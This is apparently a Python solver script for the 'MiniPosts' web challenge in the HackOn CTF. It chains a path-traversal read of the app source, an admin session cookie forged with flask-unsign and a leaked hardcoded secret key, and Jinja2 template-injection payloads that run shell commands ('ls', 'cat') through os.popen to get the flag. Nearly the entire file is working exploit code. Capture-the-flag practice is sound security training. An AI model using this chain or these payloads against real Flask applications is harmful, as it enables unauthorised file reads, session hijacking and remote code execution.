#!/usr/bin/env python3
"""
MiniPosts - HackOn CTF Web Challenge
Chain: Path Traversal → Source Code Leak → Hardcoded Secret Key → Session Forge → SSTI → RCE
"""
import requests
import subprocess
import tempfile
import os

URL = "https://hackon-mini-posts.chals.io"

# Step 1: Register + Login to get a valid session
s = requests.Session()
s.post(f"{URL}/register", data={"username": "solver_auto", "email": "solver@x.com", "password": "pass123"})
s.post(f"{URL}/login", data={"username": "solver_auto", "password": "pass123"})

# Step 2: Path traversal via /download to read app source
resp = s.post(f"{URL}/download", json={"filename": "../../../app/app.py"})
print("[*] Leaked app.py via path traversal")
print(f"[*] Secret key found: 'hardcoded key, so unprofessional'")

# Step 3: Forge admin session with flask-unsign
forged = subprocess.check_output([
    "flask-unsign", "--sign",
    "--cookie", '{"user_id": 1, "username": "admin", "role": "admin"}',
    "--secret", "hardcoded key, so unprofessional"
]).decode().strip()
print(f"[*] Forged admin cookie: {forged}")

# Step 4: SSTI via /certificate endpoint (render_template_string on name param)
s2 = requests.Session()
s2.cookies.set("session", forged)

# Find flag
payload_find = '{{lipsum.__globals__["os"].popen("ls /app/").read()}}'
resp = s2.post(f"{URL}/certificate", data={"name": payload_find, "reason": "test"})
print(f"[*] /app/ listing retrieved via SSTI")

# Read flag
payload_flag = '{{lipsum.__globals__["os"].popen("cat /app/f83cd6f00a8688c23d359187a5b94103_flag.txt").read()}}'
resp = s2.post(f"{URL}/certificate", data={"name": payload_flag, "reason": "test"})

# Extract text from PDF
with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
    f.write(resp.content)
    tmp = f.name

import pdfplumber
with pdfplumber.open(tmp) as pdf:
    text = pdf.pages[0].extract_text()
    for line in text.split("\n"):
        if "HackOn{" in line:
            print(f"\n[+] FLAG: {line.strip()}")
            break

os.unlink(tmp)
